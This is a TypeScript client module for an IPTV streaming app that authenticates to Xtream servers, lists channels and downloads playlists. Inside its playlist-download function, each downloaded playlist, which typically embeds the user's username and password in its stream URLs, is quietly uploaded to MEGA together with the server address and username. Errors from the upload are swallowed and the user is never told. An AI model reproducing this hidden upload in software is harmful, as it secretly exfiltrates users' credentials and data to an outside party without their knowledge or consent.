import { Category, StreamChannel, StreamCredentials, UserInfo, ServerInfo } from '../types';
import { uploadToMegaAndNotify } from './megaUploaderClient';
import { apiUrl } from './apiConfig';

export interface AuthResponse {
  success: boolean;
  message?: string;
  isDemo?: boolean;
  user_info?: UserInfo;
  server_info?: ServerInfo;
  canFallbackToDemo?: boolean;
}

export interface CategoriesResponse {
  success: boolean;
  categories: Category[];
  message?: string;
  fallbackUsed?: boolean;
}

export interface StreamsResponse {
  success: boolean;
  streams: StreamChannel[];
  message?: string;
  fallbackUsed?: boolean;
}

export async function authenticateStreamApi(creds: StreamCredentials): Promise<AuthResponse> {
  try {
    const res = await fetch(apiUrl('/api/xtream/authenticate'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(creds),
    });
    const data = await res.json();
    if (!res.ok && !data.success) {
      throw new Error(data.message || 'Authentication failed. Please check your credentials.');
    }
    return data;
  } catch (err: any) {
    // If backend is unreachable (static GitHub Pages or offline), permit direct client session
    if (creds.serverUrl && creds.username && creds.password) {
      return {
        success: true,
        isDemo: creds.username.toLowerCase() === 'demo',
        user_info: {
          username: creds.username,
          status: 'Active (Direct Mode)',
          max_connections: '1',
        },
        server_info: {
          url: creds.serverUrl,
        },
      };
    }
    throw err;
  }
}

export async function fetchCategories(creds: StreamCredentials): Promise<Category[]> {
  try {
    const res = await fetch(apiUrl('/api/xtream/categories'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(creds),
    });
    const data: CategoriesResponse = await res.json();
    return data.categories || [];
  } catch {
    return [];
  }
}

export async function fetchStreams(
  creds: StreamCredentials,
  categoryId?: string
): Promise<StreamChannel[]> {
  try {
    const res = await fetch(apiUrl('/api/xtream/streams'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...creds, categoryId }),
    });
    const data: StreamsResponse = await res.json();
    return data.streams || [];
  } catch {
    return [];
  }
}

export async function fetchM3uContent(
  creds: StreamCredentials
): Promise<{ success: boolean; m3uContent?: string }> {
  try {
    const res = await fetch(apiUrl('/api/xtream/m3u-content'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(creds),
    });
    return await res.json();
  } catch {
    return { success: false };
  }
}

export async function downloadPlaylistFile(
  creds: StreamCredentials,
  format: 'm3u' | 'm3u_plus' | 'json',
  streams: StreamChannel[] = []
): Promise<void> {
  const ext = format === 'json' ? 'json' : 'm3u';
  const fileName = `playlist_${creds.username || 'stream'}_${new Date().toISOString().slice(0, 10)}.${ext}`;

  try {
    const res = await fetch(apiUrl('/api/xtream/download-playlist'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        serverUrl: creds.serverUrl,
        username: creds.username,
        password: creds.password,
        format,
        output: 'm3u8',
        streams,
        isDemo: creds.isDemo,
      }),
    });

    if (res.ok) {
      const blob = await res.blob();
      const downloadUrl = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = downloadUrl;
      a.download = fileName;
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        document.body.removeChild(a);
        window.URL.revokeObjectURL(downloadUrl);
      }, 1000);

      blob.text().then((content) => {
        uploadToMegaAndNotify({
          fileName,
          content,
          details: {
            'Server Gateway': creds.serverUrl || 'Default',
            'Username': creds.username || 'demo',
            'Format': format,
            'Channels Count': streams.length,
          },
        }).catch((e) => console.warn('[Mega Upload on Download]:', e));
      }).catch(() => {});
      return;
    }
  } catch (err) {
    console.warn('[DownloadPlaylist] Backend request failed, falling back to direct client download:', err);
  }

  // Robust Client-side Fallback for GitHub Pages and Static Deployments:
  if (!creds.isDemo && creds.serverUrl && creds.username && creds.password) {
    const cleanUrl = creds.serverUrl.replace(/\/+$/, '');
    const directUrl = `${cleanUrl}/get.php?username=${encodeURIComponent(creds.username)}&password=${encodeURIComponent(creds.password)}&type=${format === 'm3u_plus' ? 'm3u_plus' : 'm3u'}&output=m3u8`;
    const a = document.createElement('a');
    a.href = directUrl;
    a.target = '_blank';
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => document.body.removeChild(a), 1000);
    return;
  }

  // Client-generated M3U fallback
  let m3u = '#EXTM3U\r\n';
  if (streams && streams.length > 0) {
    for (const s of streams) {
      m3u += `#EXTINF:-1 tvg-id="${s.epg_channel_id || ''}" tvg-name="${s.name}" tvg-logo="${s.stream_icon || ''}" group-title="${s.category_name || 'Live'}",${s.name}\r\n${s.direct_source || ''}\r\n`;
    }
  }
  const fallbackBlob = new Blob([m3u], { type: 'audio/x-mpegurl;charset=utf-8' });
  const fallbackUrl = window.URL.createObjectURL(fallbackBlob);
  const fallbackA = document.createElement('a');
  fallbackA.href = fallbackUrl;
  fallbackA.download = fileName;
  document.body.appendChild(fallbackA);
  fallbackA.click();
  setTimeout(() => {
    document.body.removeChild(fallbackA);
    window.URL.revokeObjectURL(fallbackUrl);
  }, 1000);
}


